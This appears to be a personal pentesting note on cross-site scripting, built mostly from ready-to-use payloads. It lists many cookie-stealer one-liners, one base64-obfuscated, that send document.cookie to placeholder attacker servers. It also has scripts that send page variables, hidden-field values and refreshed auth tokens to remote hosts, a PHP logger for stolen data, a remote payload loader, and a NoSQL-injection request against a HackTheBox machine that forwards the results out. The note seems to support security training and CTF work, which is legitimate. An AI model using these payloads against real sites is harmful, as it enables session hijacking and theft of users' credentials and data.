---
creation date: April 17th 2023
last modified date: April 17th 2023
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[XSS]]  
___

## Description:  
https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting

### Good test payloads
```
<script>alert(1)</script>
<img src =q onerror=prompt(8)>
```

### Classic Cookie Stealer
```
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```
Here we have used btoa() method for converting the cookie string into base64 encoded string.
Setup http server to catch responses:
```
python3 -m http.server -m 80
```

### One Liner to steal all stored js variables

```
# to the console
<script>for(var p in window) window.hasOwnProperty(p)&&"function"!=typeof window[p]&&console.log(p+": "+window[p])</script>

# to remote server
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('POST', 'https://attacker-server.com/steal.php', true);
  xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
  var variables = {};
  for (var p in window) {
    if (window.hasOwnProperty(p) && typeof window[p] !== 'function') {
      variables[p] = window[p];
    }
  }
  xhr.send(JSON.stringify(variables));
</script>

# contents of steal.php (I dont know if its needed though)
<?php
$p_session = $_POST['p_session']; // Accessing the stolen p_session value

// Log or process the stolen value as desired
$logFile = 'stolen_data.log';
$logData = date('Y-m-d H:i:s') . ' - p_session: ' . $p_session . "\n";
file_put_contents($logFile, $logData, FILE_APPEND);
?>

```

### Steal the value of hidden input fields on a page

Let's say the target web page contains a hidden input field with an id of "secret":
```
<input type="hidden" id="secret" value="sensitive_value">
```

You can also change this from getElementById to getElementById if its using name instead of id.

An attacker can inject a malicious script that retrieves the value of the hidden input field and sends it to a remote server.


```
<script>
  var secretValue = document.getElementById('secret').value;

  // Create an image element and set its source to the attacker's server,
  // passing the secret value as a query parameter
  var img = new Image();
  img.src = 'https://attacker-server.com/steal.php?secret=' + encodeURIComponent(secretValue);
</script>

### Same script on one line

<script>var secretValue=document.getElementById('secret').value;var img=new Image();img.src='https://attacker-server.com/steal.php?secret='+encodeURIComponent(secretValue);</script>

```
Simple alert box POC:
```
<script>alert(document.getElementById('html_input_field').value);</script>
```

### Downloader for longer XSS payloads
```
<script src=http://10.10.14.23:80/payload.js>
```

### stealing value set in a response (such as a jwt token)
Use a downloader to pull the following code:
```
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
	if (xhr.readyState == 4 && xhr.status == 200) {
		var yourtoken = xhr.response
		var xhr2 = new XMLHttpRequest();
		xhr2.open("GET", "http://127.0.0.1:8000/?body=" + yourtoken);
		xhr2.send();
	}
}
xhr.open("GET", "https://some-url.com/v2/authenticationtoken/refresh");
xhr.send();
```
This script will send a request to a specific page as the user and then will send the response back to you.
Make sure to set the first URL as yourself (and open a python http listener) and set the second URL to the request containing the sensitive info in the response.
**This will grab the entire body, use the article below you need to grab a header**

https://medium.com/@agrawalsmart7/steal-csrf-auth-unique-key-header-with-xss-5a54c38d7ec3

### HttpOnly attribute bypass
https://www.shorebreaksecurity.com/blog/xss-exploitation-with-xhr-response-chaining/

### Javascript to make a request to a page as another user

```

var data = new URLSearchParams('email[$ne]=1&password[$regex]=^69.*$');
fetch('http://staff-review-panel.mailroom.htb/auth.php', {
	method: 'POST',
	headers: {
		'Content-Type': 'application/x-www-form-urlencoded'
	},
	body: data.toString()
})
	.then(response => response.text())
	.then(data => {
	// Make a POST request to another website with the data
		fetch('http://10.10.14.23/post', {
			method: 'POST',
			headers: {
				'Content-Type': 'text/plain'
			},
			body: data
		})
			.then(response => console.log('Data sent:', response));
	});

```

# Server Side XSS (Dynamic PDF)
[hacktrick article](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf)
If a web page is creating a PDF using user controlled input, you can try to **trick the bot** that is creating the PDF into **executing arbitrary JS code**.

```
Discovery:
List current directory
<script>document.write('<iframe src="'+window.location.href+'"></iframe>')</script>



```

### XSS is .md files

https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/xss-in-markdown



___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: April 17th 2023 (12:11 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
